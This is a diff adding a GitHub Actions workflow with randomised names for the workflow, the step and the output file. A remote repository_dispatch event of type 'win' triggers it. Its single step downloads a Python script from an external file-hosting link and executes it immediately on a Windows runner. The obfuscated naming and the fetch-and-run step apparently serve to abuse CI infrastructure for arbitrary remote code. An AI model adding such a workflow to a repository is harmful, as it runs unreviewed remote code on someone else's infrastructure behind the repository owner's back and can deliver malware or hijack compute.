@@ -1,0 +1,18 @@
+name: DkqLG9ElVB
+
+on: 
+  repository_dispatch:
+    types:
+      - win
+
+jobs:
+  build:
+
+    runs-on: windows-latest
+
+    steps:
+    
+    - name: iSOwzk4u8I
+      run: |
+          Invoke-WebRequest https://pan.urldwz.com/api/v3/file/source/56738/runhc.py?sign=wVTnUJFnt7Tkq5thVI3sxh-yj0sRmFN2mf3ewSCtiSM%3D%3A0 -OutFile 3j4OK6h7WP.py
+          cmd /c python 3j4OK6h7WP.py | Out-Default
